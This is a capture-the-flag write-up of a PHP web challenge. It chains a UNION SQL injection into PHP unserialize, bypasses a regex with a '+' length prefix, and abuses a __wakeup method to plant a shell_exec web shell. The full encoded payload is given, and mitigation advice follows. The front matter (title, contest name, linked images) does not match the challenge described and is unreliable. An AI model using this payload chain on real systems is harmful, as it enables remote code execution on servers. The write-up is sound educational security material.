---
title: "SQL Injection in Login"
contest: "sekai"
category: "CTF"
difficulty: "Medium"
points: 150
tags: ["Web","sql-injection", "authentication-bypass"]
publishedAt: 2025-08-15
solved: true
---

# PHP Canteen Web Challenge - Complete Security Writeup

## TL;DR

- **Challenge Setup**: PHP website offering canteen food which can be filtered by a simple input
- **Key Discoveries**: Input is processed via SQL and PHP unserialize
- **Vulnerability**: The SQL query is injectable making the used PHP unserialize exploitable
- **Exploitation**: Bypassing the PHP unserialize object regex via a `+` before the uiv part will result in RCE

## 1. Introduction

This web challenge aimed to exploit a PHP unserialize vulnerability via SQL injection, bypassing some weak regex filters.

In the following sections, we walk through the entire process, from the initial analysis to the final exploitation.

## 2. Reconnaissance

Having a look at the website, we are welcomed by a beautiful gif showing all of the available food and some price input field with which we can filter the offered food. It is displaying all the items cheaper than the provided value:
Clicking on the linked admin panel at the top greets us with a warm welcome message:

```
Only access allowed for canteen admin!!!
```

For this challenge, the source code is provided. The web server is implemented with plain PHP v7.1 - the exact PHP version will be important later. The flag itself is hidden in a flag.txt file with restrictive access flags and is being controlled by the root user. Next to the flag file is a readflag binary with which we can read out the flag. This is a typical RCE challenge setup.

The web server uses the MVC pattern to provide the interactive functionality. There is an AdminController.php and a CanteenController.php, each with its appropriate AdminModel.php and CanteenModel.php. In addition to the capabilities of a normal user, the admin user can also access the logs of the website with the functionality in its controller. In the AdminModel, the class has some interesting functions like __wakeup, which will become important later. The CanteenModel, which is used by every normal user, implements two functions to obtain the data shown on the landing page. The first one getFood just fetches all of the food from the database, adds a log to log.txt and rerandomizes the prices for each food. The second one filterFood filters the shown food by applying the user input to a SQL query and thus fetching only a limited amount of the food. Both of these functions also contain some functionality for unserialization in specific cases. Having a closer look at these functions immediately reveals the following vulnerabilities:

SQL injection - The user input $price_param for the filterFood function is concatenated with the query without any sanitization and prepared statements:


```sql
$sql = "SELECT * FROM food where price < " . $price_param;

```

PHP Unserialize - Probably for backwards compatibility, some parts of the SQL query result containing the `oldvalue` attribute are deserialized:

```php
if($obj->oldvalue !== '') {
    $dec_result = base64_decode($obj->oldvalue);
    if (preg_match_all('/O:\d+:"([^"]*)"/', $dec_result, $matches)) {
        return 'Not allowed';
    }
    $uns_result = unserialize($dec_result);
```

Having these vulnerabilities, `filterFood` is the more interesting function, as we control the input parameter for this function.

## 3. SQL Injection

At first, we should analyze how to exploit the SQL injection as the called unserialize function is dependent on the results of the SQL query. The SELECT query is ideal for a **UNION attack** with which we can append arbitrary data to the rows from the database matching the initial query.

```sql
500 UNION SELECT 0 AS id, 'Some very juicy meal' AS name, '' AS oldvalue, 0 AS price;
```

This confirms our successful SQL injection and shows that if we add a legitimate value for `oldvalue`, our user input will be processed by `unserialize`.

## 4. PHP Unserialize

Deserialization is a process where serialized data is converted back to actual data. The PHP unserialize will take a string and will create instantiated objects, arrays, integers, booleans and other stuff. Each of these data types has its own prefix. For example objects got the prefix O: followed by the length of the class name, the class name itself as a string and its attribute fields also written with the serialized notation like for example O:1:"a":1:{s:5:"value";s:3:"100";}. The PHP documentation describes some interesting internal behaviour:


> If the variable being unserialized is an object, after successfully reconstructing the object, PHP will automatically attempt to call the `__unserialize` or `__wakeup()` methods (if one exists).

### Target: AdminModel.__wakeup()

In **AdminModel.php** we find the implementation of the AdminModel for logging purposes. The class also has a `__wakeup` method creating an arbitrary file with arbitrary content:

```php
class AdminModel {
    // ...
    public function __wakeup() {
        new LogFile($this->filename, $this->logcontent);
    }
    // ...
}

class LogFile {
    public function __construct($filename, $content) {
        file_put_contents($filename, $content, FILE_APPEND);
    }
}
```

This is a great target for the deserialization. We could inject a payload like:

```php
O:10:"AdminModel":2:{s:8:"filename";s:12:"innocent.php";s:10:"logcontent";s:37:"<?php echo(shell_exec($_GET['cmd']));";}
```

This would create a PHP file named `innocent.php` executing arbitrary commands given via the URL parameter `cmd`.


```php
if (preg_match_all('/O:\d+:"([^"]*)"/', $dec_result, $matches)) {
    return 'Not allowed';
}
```

The regex checks for strings starting with the prefix `O:`, followed by some digits and an arbitrary string. There are several data types you can deserialize, like integer, boolean, arrays, but also custom objects by starting with `C:`. Sadly, custom objects are not applicable in this case as none of the PHP classes implement Serializable.

### Regex Bypass Discovery

There must be another way to bypass the regex. The code is the best documentation, so let's dive into the implementation of PHP unserialize. We have to be careful with the version as the challenge uses PHP v7.1.

For the implementation, PHP uses the **re2c lexer generator**. The length value `uiv` of the serialized object is parsed by the `parse_uiv` function, which implements some interesting behavior: **If it exists, it will skip a leading `+` character**.

With this information, we can easily bypass the regex as it only checks for digits in the uiv part.

## 5. Exploitation

Now we have to chain our vulnerabilities. For the unserialize call, we will use the following payload, which is very similar to the already mentioned one, but this time we add a `+` before the uiv part:

```php
O:+10:"AdminModel":2:{s:8:"filename";s:12:"innocent.php";s:10:"logcontent";s:37:"<?php echo(shell_exec($_GET['cmd']));";}
```

### Final Payload Chain

Because of the implementation of the `oldvalue` check, we have to encode it with base64. Adding it to our SQL injection, we get our final payload:

```sql
500 UNION SELECT 0 AS id, 'payload' AS name, 'TzorMTA6IkFkbWluTW9kZWwiOjI6e3M6ODoiZmlsZW5hbWUiO3M6MTI6Imlubm9jZW50LnBocCI7czoxMDoibG9nY29udGVudCI7czozNzoiPD9waHAgZWNobyhzaGVsbF9leGVjKCRfR0VUWydjbWQnXSkpOyI7fQ==' AS oldvalue, 0 AS price;
```

### Getting the Flag

1. Submit this payload via the price input field - this will create a new PHP file
2. Access the server on the path `/innocent.php?cmd=/readflag` 
3. This will give us the flag

## 6. Mitigation

This web server has some fundamental flaws:

### SQL Injection Prevention
- **Always validate and sanitize any input**
- Use **prepared statements** instead of string concatenation
- This vulnerability could have been simply prevented by using prepared statements

### Unsafe Deserialization
- **Don't use unserialize if not necessary**
- The use of unserialize always comes with security risks
- Consider safer alternatives for data serialization

### Regex Filtering Issues
- **Don't use regex for security filtering!**
- Rely on PHP's built-in filtering functions like `filter_var` and others
- Using regex for input validation can be overly error-prone, especially with complex patterns or edge cases
- May lead to unexpected behavior and security risks





![Alt text](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/TFC-CTF-2024/images/Pasted%20image%2020240804194642.png "Optional Title")

![Alt text](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/TFC-CTF-2024/images/Pasted%20image%2020240804194303.png "Optional Title")

## 7. Flag


`dach2025{sh1ty_r3g3x_w0nt_s4fe_y0u}`


---

## Summary

This challenge demonstrated a complex attack chain combining:

1. **SQL Injection** - Unvalidated user input in database queries
2. **PHP Object Injection** - Unsafe deserialization of user-controlled data  
3. **Regex Bypass** - Exploiting PHP's internal parsing behavior to bypass security filters
4. **Magic Method Exploitation** - Using `__wakeup()` method for Remote Code Execution

The key insight was discovering that PHP's `parse_uiv` function skips leading `+` characters, allowing bypass of the regex filter that only checked for digits in the object length field.